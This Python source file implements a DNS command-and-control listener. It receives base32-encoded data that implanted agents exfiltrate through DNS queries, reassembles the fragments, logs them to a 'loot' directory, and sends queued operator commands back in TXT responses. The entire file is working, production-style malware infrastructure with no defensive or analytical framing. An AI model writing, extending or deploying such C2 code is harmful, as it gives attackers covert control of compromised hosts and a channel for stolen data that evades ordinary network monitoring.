"""Standalone DNS C2 listener — binds UDP 53, parses queries, responds TXT."""

import base64
import os
import socket
import threading
import time
from typing import Optional
from collections import deque

from common.dns_protocol import DnsServerProtocol, _b32_decode


class DnsC2Listener:
    """Production DNS C2 listener — UDP 53, session tracking, command queuing."""
    def __init__(self, domain: str, loot_dir: str = './loot'):
        self._protocol = DnsServerProtocol(domain)
        self._loot_dir = loot_dir
        self._sock: Optional[socket.socket] = None
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()
        self._commands: dict[str, deque] = {}
        self._results: dict[str, deque] = {}
        self._fragments: dict[str, dict[int, str]] = {}
        os.makedirs(loot_dir, exist_ok=True)

    def start(self, port: int = 53) -> None:
        """Bind UDP socket, begin listening for DNS queries."""
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(('0.0.0.0', port))
        self._running = True
        self._thread = threading.Thread(target=self._listen, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Graceful shutdown."""
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        if self._thread:
            self._thread.join(timeout=3)

    def queue_command(self, agent_id: str, command: str) -> None:
        """Queue command for next TXT response."""
        with self._lock:
            self._commands.setdefault(agent_id, deque()).append(command)

    def poll_result(self, timeout: Optional[float] = None) -> Optional[tuple]:
        """Return next (agent_id, data) or None if no results pending."""
        deadline = time.monotonic() + timeout if timeout else None
        while True:
            with self._lock:
                for aid, q in list(self._results.items()):
                    if q:
                        return (aid, q.popleft())
            if deadline and time.monotonic() >= deadline:
                return None
            time.sleep(0.1)

    def _listen(self) -> None:
        while self._running:
            try:
                data, addr = self._sock.recvfrom(4096)
            except (OSError, socket.timeout):
                if not self._running:
                    break
                continue
            resp = self._handle_query(data)
            if resp:
                try:
                    self._sock.sendto(resp, addr)
                except OSError:
                    pass

    def _handle_query(self, data: bytes) -> Optional[bytes]:
        parsed = self._protocol.parse_query(data)
        if parsed is None:
            return None
        agent_id = parsed['agent_id']
        labels = parsed['labels']
        tid = parsed['trans_id']
        if not agent_id:
            return self._protocol.build_refused(tid, labels)
        if parsed['qtype'] == 1 and parsed['payload']:
            decoded = _b32_decode(parsed['payload']).decode(errors='ignore')
            seq, total = parsed['seq'], parsed['total']
            if total > 1:
                frags = self._fragments.setdefault(agent_id, {})
                frags[seq] = decoded
                if len(frags) == total:
                    decoded = ''.join(frags[i] for i in sorted(frags))
                    del self._fragments[agent_id]
                else:
                    decoded = ''
            if decoded:
                with self._lock:
                    self._results.setdefault(agent_id, deque()).append(decoded)
                try:
                    path = os.path.join(self._loot_dir, f'{agent_id}.log')
                    with open(path, 'a') as f:
                        f.write(f'[{time.strftime("%Y-%m-%d %H:%M:%S")}] {decoded[:500]}\n')
                except Exception:
                    pass
            return self._protocol.build_a_response(tid, labels)
        if parsed['qtype'] == 16:
            cmd = b''
            with self._lock:
                q = self._commands.get(agent_id)
                if q and q:
                    raw = q.popleft()
                    cmd = base64.b32encode(raw.encode()).decode(
                        ).rstrip('=').lower().encode() if isinstance(raw, str) else raw
            return self._protocol.build_txt_response(tid, labels, cmd)
        return self._protocol.build_refused(tid, labels)
